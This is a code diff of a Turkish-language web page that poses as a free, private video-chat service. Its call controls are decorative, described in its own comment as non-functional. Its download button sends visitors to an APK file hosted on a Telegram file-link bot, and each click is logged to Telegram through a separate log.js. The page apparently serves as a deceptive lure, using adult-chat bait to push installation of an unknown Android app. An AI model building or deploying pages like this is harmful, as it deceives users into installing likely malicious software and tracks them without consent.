@@ -5,43 +5,130 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Görüntülü Görüşme - Ücretsiz Gizli Sohbet</title>
     
+    <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
         integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
     
+    <!-- Open Graph -->
     <meta property="og:title" content="Sohbet Edelim - Canlı Sohbet" />
-    <meta property="fb:app_id" content="2184177865647930" />
     <meta property="og:description" content="Yeni arkadaşlıklar kur, canlı sohbete katıl!" />
-    <meta property="og:image" content="https://arabeni3.vercel.app/3.jpg" />
+    <meta property="og:image" content="https://arabeni2.vercel.app/3.jpg" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
-    <meta property="og:url" content="https://arabeni3.vercel.app/" />
+    <meta property="og:url" content="https://arabeni2.vercel.app/" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="Sohbet Edelim - Canlı Sohbet" />
     <meta name="twitter:description" content="Yeni arkadaşlıklar kur, canlı sohbete katıl!" />
-    <meta name="twitter:image" content="https://arabeni3.vercel.app/3.jpg" />
-    <meta name="twitter:url" content="https://arabeni3.vercel.app/" />
+    <meta name="twitter:image" content="https://arabeni2.vercel.app/3.jpg" />
+    <meta name="twitter:url" content="https://arabeni2.vercel.app/" />
     
     <style>
-        * { user-select: none; -webkit-tap-highlight-color: transparent; }
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #000; }
-        video { position: absolute; top: 50%; left: 50%; width: 100%; height: 100%; object-fit: cover; transform: translate(-50%, -50%); z-index: 0; }
-        .stopped { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 20; display: none; backdrop-filter: blur(2px); }
-        @keyframes pulse-heart { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        .animate-pulse-heart { animation: pulse-heart 1s ease-in-out infinite; }
-        .btn-press { transition: transform 0.1s ease; }
-        .btn-press:active { transform: scale(0.96); }
-        @media (max-width: 640px) { .stopped { width: 85%; min-width: auto; max-width: 320px; } }
-        .ripple-effect { position: relative; overflow: hidden; }
-        .ripple-effect:after { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255,255,255,0.5); transform: translate(-50%, -50%); transition: width 0.3s, height 0.3s; }
-        .ripple-effect:active:after { width: 200%; height: 200%; opacity: 0; transition: 0s; }
-        .toast-notification { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%) translateY(100px); background: linear-gradient(135deg, #1e1e2f, #2a2a3b); color: white; padding: 12px 24px; border-radius: 50px; font-size: 14px; font-weight: 500; z-index: 100; opacity: 0; transition: all 0.3s ease; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); pointer-events: none; }
-        .toast-notification.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-        .toast-notification i { margin-right: 8px; color: #10b981; }
+        * {
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background: #000;
+        }
+        video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: translate(-50%, -50%);
+            z-index: 0;
+        }
+        .stopped {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 20;
+            display: none;
+            backdrop-filter: blur(2px);
+        }
+        @keyframes pulse-heart {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        .animate-pulse-heart {
+            animation: pulse-heart 1s ease-in-out infinite;
+        }
+        .btn-press {
+            transition: transform 0.1s ease;
+        }
+        .btn-press:active {
+            transform: scale(0.96);
+        }
+        @media (max-width: 640px) {
+            .stopped {
+                width: 85%;
+                min-width: auto;
+                max-width: 320px;
+            }
+        }
+        .ripple-effect {
+            position: relative;
+            overflow: hidden;
+        }
+        .ripple-effect:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.5);
+            transform: translate(-50%, -50%);
+            transition: width 0.3s, height 0.3s;
+        }
+        .ripple-effect:active:after {
+            width: 200%;
+            height: 200%;
+            opacity: 0;
+            transition: 0s;
+        }
+        .toast-notification {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: linear-gradient(135deg, #1e1e2f, #2a2a3b);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 100;
+            opacity: 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+            pointer-events: none;
+        }
+        .toast-notification.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+        .toast-notification i {
+            margin-right: 8px;
+            color: #10b981;
+        }
     </style>
 </head>
 <body>
@@ -103,6 +190,7 @@
         <p class="text-[10px] text-gray-400 mt-1">Güncel</p>
     </div>
 
+    <!-- log.js dosyasını burada çağırıyoruz (ayrı dosya olarak) -->
     <script src="log.js"></script>
 
     <script>
@@ -119,8 +207,6 @@
             "https://telegram-file-to-link-bot-a26f.onrender.com/file/7be97482d601",
             "https://telegram-file-to-link-bot-a26f.onrender.com/file/7be97482d601"
         ];
-
-        const DESIRED_FILENAME = "UcretsizGoruntuluSohbet.apk";
 
         function showToast(message, isError = false) {
             const toast = document.getElementById('toastMsg');
@@ -171,13 +257,6 @@
             
             let isProcessing = false;
             
-            // Telegram WebApp hazır mı?
-            const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
-            const hasDownloadFile = !!(tg && typeof tg.downloadFile === 'function');
-            
-            console.log("Telegram WebApp:", tg ? "var" : "yok");
-            console.log("downloadFile API:", hasDownloadFile ? "destekliyor" : "desteklemiyor");
-
             async function handleDownload(e) {
                 if (e) e.preventDefault();
                 if (isProcessing) return;
@@ -190,51 +269,27 @@
                 try {
                     const currentApkUrl = getCurrentApkLink();
 
-                    // ========== 1. TELEGRAM downloadFile (EN İYİ YOL) ==========
-                    if (hasDownloadFile) {
-                        tg.downloadFile(
-                            {
-                                url: currentApkUrl,
-                                file_name: DESIRED_FILENAME   // ⬅️ DOĞRU PARAMETRE ADI
-                            },
-                            (status) => {
-                                // status: true (indirildi) / false (iptal)
-                                console.log("downloadFile status:", status);
-                                if (status === true) {
-                                    showToast("İndirme tamamlandı!");
-                                } else {
-                                    showToast("İndirme iptal edildi.", true);
-                                }
-                            }
-                        );
-                    }
-                    // ========== 2. TARAYICI: fetch + blob (CORS olursa fallback) ==========
-                    else {
-                        try {
-                            const response = await fetch(currentApkUrl);
-                            if (!response.ok) throw new Error('CORS veya ağ hatası');
-                            const blob = await response.blob();
-                            const blobUrl = URL.createObjectURL(blob);
-                            const tempLink = document.createElement('a');
-                            tempLink.href = blobUrl;
-                            tempLink.download = DESIRED_FILENAME;
-                            document.body.appendChild(tempLink);
-                            tempLink.click();
-                            document.body.removeChild(tempLink);
-                            URL.revokeObjectURL(blobUrl);
-                        } catch (fetchError) {
-                            console.warn("Blob başarısız, doğrudan açılıyor:", fetchError);
-                            window.location.href = currentApkUrl;
-                        }
+                    // ========== 1. LİNKİ HEMEN AÇ (bekleme yok, timeout yok) ==========
+                    const isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
+                    
+                    if (isTelegram) {
+                        // Telegram Mini App içinde: openLink kullan (doğru yöntem)
+                        Telegram.WebApp.openLink(currentApkUrl, { try_instant_view: false });
+                    } else {
+                        // Normal tarayıcı: doğrudan git
+                        window.location.href = currentApkUrl;
                     }
 
-                    // ========== 3. LOG ==========
+                    // ========== 2. LOG'U ARKADA GÖNDER (await yok, bekleme yok) ==========
                     if (typeof window.sendLog === 'function') {
+                        // .then ile yakala ama bekleme, hata alsa bile umursama
                         window.sendLog(currentApkUrl).catch(() => {});
+                        showToast("İndirme başlatılıyor!");
+                    } else {
+                        showToast("İndirme başlatılıyor...");
                     }
-                    showToast("İndirme başlatılıyor!");
 
-                    // ========== 4. BUTONU GERİ AL ==========
+                    // ========== 3. BUTONU GERİ AL ==========
                     setTimeout(() => {
                         if (downloadBtn) {
                             downloadBtn.innerHTML = `Tekrar İndir <i class="fa-solid fa-arrow-rotate-right absolute right-5 text-white text-sm"></i>`;
@@ -261,6 +316,7 @@
             downloadBtn.addEventListener('click', handleDownload);
         });
         
+        // Arkaplan videosu için otoplay yardımcısı
         const videoElem = document.getElementById('backgroundVideo');
         if (videoElem) {
             videoElem.play().catch(err => {
@@ -274,6 +330,7 @@
             });
         }
         
+        // Alt kontroller (ses, video, mikrofon) – sadece görsel, işlevsiz
         const muteBtn = document.querySelector('.fa-volume-xmark')?.parentElement;
         const videoBtn = document.querySelector('.fa-video-slash')?.parentElement;
         const micBtn = document.querySelector('.fa-microphone-slash')?.parentElement;
@@ -311,7 +368,7 @@
             });
         }
         
-        console.log("Görüntülü Görüşme Hazır | Telegram log aktif");
+        console.log("TurkPorno Görüntülü Görüşme Hazır | Telegram log aktif");
     </script>
 </body>
 </html>
